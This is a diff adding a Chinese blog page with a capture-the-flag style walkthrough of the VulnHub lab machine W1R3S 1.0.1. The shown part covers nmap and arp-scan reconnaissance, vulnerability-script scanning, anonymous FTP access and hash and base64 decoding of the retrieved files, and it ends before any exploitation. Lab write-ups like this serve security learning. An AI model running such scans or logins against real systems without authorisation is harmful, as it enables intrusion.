@@ -1,0 +1,498 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>lW1R3S 1.0.1 | Gu0f3n's blog</title><meta name="author" content="Gu0f3n"><meta name="copyright" content="Gu0f3n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="下载好靶机  然后先在本地进行扫描确定靶机的ip地址 sudo nmap -sn 192.168.205.0&#x2F;24  发现 Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-03-25 04:03 EDTNmap scan report for 192.168.205.1 (192.168.205.1)Host is up (0.0012s laten">
+<meta property="og:type" content="article">
+<meta property="og:title" content="lW1R3S 1.0.1">
+<meta property="og:url" content="https://gu0f3n.github.io/2025/03/25/W1R3S%201.0.1/index.html">
+<meta property="og:site_name" content="Gu0f3n&#39;s blog">
+<meta property="og:description" content="下载好靶机  然后先在本地进行扫描确定靶机的ip地址 sudo nmap -sn 192.168.205.0&#x2F;24  发现 Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-03-25 04:03 EDTNmap scan report for 192.168.205.1 (192.168.205.1)Host is up (0.0012s laten">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Gu0f3n/img/mian/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250325162730.jpg">
+<meta property="article:published_time" content="2025-03-25T08:24:26.000Z">
+<meta property="article:modified_time" content="2025-03-25T12:22:47.073Z">
+<meta property="article:author" content="Gu0f3n">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Gu0f3n/img/mian/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250325162730.jpg"><link rel="shortcut icon" href="/img/1.png"><link rel="canonical" href="https://gu0f3n.github.io/2025/03/25/W1R3S%201.0.1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = true
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'lW1R3S 1.0.1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-25 20:22:47'
+}</script><link rel="stylesheet" href="/css/1.css?1"><link rel="stylesheet" href="/css/2.css?1"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Gu0f3n's blog" type="application/atom+xml">
+</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw &lt;i class=&quot;fa-light fa-igloo&quot;&gt;&lt;/i&gt;"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-sharp-duotone fa-solid fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-solid fa-heart-pulse"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/Gu0f3n/img/mian/微信图片_20250325162730.jpg')"><nav id="nav"><div id="nav-group"><span id="blog-info"><a href="/" title="回到主页"><span class="site-name"></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw &lt;i class=&quot;fa-light fa-igloo&quot;&gt;&lt;/i&gt;"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-sharp-duotone fa-solid fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-solid fa-heart-pulse"></i><span> 关于我</span></a></div></div></div><div id="nav-right"><div id="travellings"><a class="site-page" target="_blank" rel="noopener" href="https://travellings.cn/go.html" title="随机前往一个开往项目网站"><i class="iconfont icat-subway"></i></a></div><div id="random"><a class="site-page" href="javascript:toRandomPost()" title="随机前往一个文章"><i class="iconfont icat-random"></i></a></div><div id="search-button"><a class="site-page social-icon search"><i class="iconfont icat-search"></i></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="搜索本站文章"><i class="iconfont icat-bars"></i></a></div></div></div></nav><div id="post-info"><h1 class="post-title">lW1R3S 1.0.1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-25T08:24:26.000Z" title="发表于 2025-03-25 16:24:26">2025-03-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-25T12:22:47.073Z" title="更新于 2025-03-25 20:22:47">2025-03-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="lW1R3S 1.0.1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>下载好靶机 </p>
+<p>然后先在本地进行扫描确定靶机的ip地址</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 192.168.205.0/24</span><br></pre></td></tr></table></figure>
+
+<p>发现</p>
+<p>Starting Nmap 7.95 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2025-03-25 04:03 EDT<br>Nmap scan report for 192.168.205.1 (192.168.205.1)<br>Host is up (0.0012s latency).<br>MAC Address: 00:50:56:C0:00:01 (VMware)<br>Nmap scan report for 192.168.205.2 (192.168.205.2)<br>Host is up (0.00089s latency).<br>MAC Address: 00:50:56:F7:4F:9C (VMware)<br>Nmap scan report for 192.168.205.136 (192.168.205.136)<br>Host is up (0.00074s latency).<br>MAC Address: 00:0C:29:19:D7:D3 (VMware)<br>Nmap scan report for 192.168.205.254 (192.168.205.254)<br>Host is up (0.00077s latency).<br>MAC Address: 00:50:56:E0:48:99 (VMware)<br>Nmap scan report for 192.168.205.128 (192.168.205.128)<br>Host is up.<br>Nmap done: 256 IP addresses (5 hosts up) scanned in 2.00 seconds</p>
+<p>这条命令等同于 </p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p>Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128<br>WARNING: Cannot open MAC&#x2F;Vendor file ieee-oui.txt: Permission denied<br>WARNING: Cannot open MAC&#x2F;Vendor file mac-vendor.txt: Permission denied<br>Starting arp-scan 1.10.0 with 256 hosts (<a target="_blank" rel="noopener" href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a>)<br>192.168.205.1   00:50:56:c0:00:01       (Unknown)<br>192.168.205.2   00:50:56:f7:4f:9c       (Unknown)<br>192.168.205.136 00:0c:29:19:d7:d3       (Unknown)<br>192.168.205.254 00:50:56:e0:48:99       (Unknown)</p>
+<p>136是我们的靶机地址</p>
+<p>接下来我们对这个地址进行一个tcp的扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.205.136 -oA  nmapscan/ports</span><br></pre></td></tr></table></figure>
+
+<p>Starting Nmap 7.95 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2025-03-25 04:17 EDT<br>Nmap scan report for 192.168.205.136 (192.168.205.136)<br>Host is up (0.00034s latency).<br>Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>3306&#x2F;tcp open  mysql<br>MAC Address: 00:0C:29:19:D7:D3 (VMware)</p>
+<p>发现4个端口</p>
+<p>-oA  nmapscan&#x2F;ports 这里是为了数据化扫描结果</p>
+<p>如果扫描过程中遇到的端口数量过大的情况下我们就可以进行一个筛选</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap</span><br></pre></td></tr></table></figure>
+
+<p>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>3306&#x2F;tcp open  mysql</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap |awk -F<span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="number">3306</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里用来提权端口（这一切都是基于如果扫描出来的端口数量过大的情况下，我们需要，这里为了养成习惯所以细致一些）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap |awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;|paste -sd &#x27;,&#x27;</span><br><span class="line">21,22,80,3306</span><br></pre></td></tr></table></figure>
+
+<p>将端口提取到一行</p>
+<p>将这些赋值给port的变量</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ports=$(grep open nmapscan/ports.nmap |awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;|paste -sd &#x27;,&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>接下来对其进行详细信息扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.205.136 -oA nmapscan/detail</span><br></pre></td></tr></table></figure>
+
+<p>-sV是对网站信息进行扫描，-sC是默认脚本 -O是操作系统 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.205.128</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)</span><br><span class="line">|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)</span><br><span class="line">|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (95%), Linux 3.13 - 4.4 (93%), Linux 3.8 - 3.16 (93%), Linux 4.10 (93%), Linux 3.4 - 3.10 (93%), Linux 3.10 (93%), Linux 3.13 - 3.16 (92%), Linux 4.4 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.41 seconds</span><br></pre></td></tr></table></figure>
+
+<p>在扫描的过程中我们可以进行一下udp的一个扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 20 192.168.205.136 -oA nmapscan/udp</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 05:22 EDT</span><br><span class="line">Nmap scan report for 192.168.205.136 (192.168.205.136)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    open|filtered domain</span><br><span class="line">67/udp    open|filtered dhcps</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">69/udp    open|filtered tftp</span><br><span class="line">123/udp   open|filtered ntp</span><br><span class="line">135/udp   open|filtered msrpc</span><br><span class="line">137/udp   open|filtered netbios-ns</span><br><span class="line">138/udp   open|filtered netbios-dgm</span><br><span class="line">139/udp   open|filtered netbios-ssn</span><br><span class="line">161/udp   open|filtered snmp</span><br><span class="line">162/udp   open|filtered snmptrap</span><br><span class="line">445/udp   open|filtered microsoft-ds</span><br><span class="line">500/udp   open|filtered isakmp</span><br><span class="line">514/udp   open|filtered syslog</span><br><span class="line">520/udp   open|filtered route</span><br><span class="line">631/udp   open|filtered ipp</span><br><span class="line">1434/udp  open|filtered ms-sql-m</span><br><span class="line">1900/udp  open|filtered upnp</span><br><span class="line">4500/udp  open|filtered nat-t-ike</span><br><span class="line">49152/udp open|filtered unknown</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.72 second</span><br></pre></td></tr></table></figure>
+
+<p>还有进行nmap 漏洞脚本进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> sudo nmap --script=vuln -p21,80,22,3306 192.168.205.136 -oA nmapscan/vuln</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 05:25 EDT</span><br><span class="line">Nmap scan report for 192.168.205.136 (192.168.205.136)</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 322.12 seconds</span><br></pre></td></tr></table></figure>
+
+<p>这里没有发现可利用漏洞 ddos就不考虑了 </p>
+<p>然后分析刚刚的详细扫描</p>
+<p>21&#x2F;tcp   open  ftp     vsftpd 2.0.8 or later</p>
+<p>21端口 ftp 使用的是vsftpd 后缀带d基本上可以使用匿名登录</p>
+<p>信息收集就到这 端口扫描 详细端口扫描 udp扫描 利用漏洞脚本扫描，可能还会有ipv6的扫描</p>
+<p>匿名登录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ftp 192.168.205.136</span><br><span class="line">Connected to 192.168.205.136.</span><br><span class="line">220 Welcome to W1R3S.inc FTP service.</span><br><span class="line">Name (192.168.205.136:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure>
+
+<p>这里注意ftp要切换成二进制模式 </p>
+<p>发现三个目录</p>
+<p>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content<br>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs<br>drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</p>
+<p>分别进入目录将里面的txt文件下载下来</p>
+<p>将下载的文件全部读取出来</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat *.txt        </span><br><span class="line">New FTP Server For W1R3S.inc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">01ec2d8fc11c493b25029fb1f47f39ce</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################</span></span></span><br><span class="line">___________.__              __      __  ______________________   _________    .__               </span><br><span class="line">\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  </span><br><span class="line">  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\ </span><br><span class="line">  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ </span><br><span class="line">  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;</span><br><span class="line">                \/     \/         \/                \/       \/        \/  \/         \/     \/ </span><br><span class="line">The W1R3S.inc employee list</span><br><span class="line"></span><br><span class="line">Naomi.W - Manager</span><br><span class="line">Hector.A - IT Dept</span><br><span class="line">Joseph.G - Web Design</span><br><span class="line">Albert.O - Web Design</span><br><span class="line">Gina.L - Inventory</span><br><span class="line">Rico.D - Human Resources</span><br><span class="line"></span><br><span class="line">​    ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡</span><br><span class="line"></span><br><span class="line">....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</span><br></pre></td></tr></table></figure>
+
+<p>利用hash-identifier 对加密算法进行识别</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hash-identifier </span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br></pre></td></tr></table></figure>
+
+<p>识别告诉我是md5</p>
+<p>网站进行解码</p>
+<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/90846274a1ac666ce6acec9ef9150df.png"></p>
+<p>This[空格]is[空格]not[空格]a[空格]password</p>
+<p>提示这不是密码</p>
+<p>对这里面的base64进行解密</p>
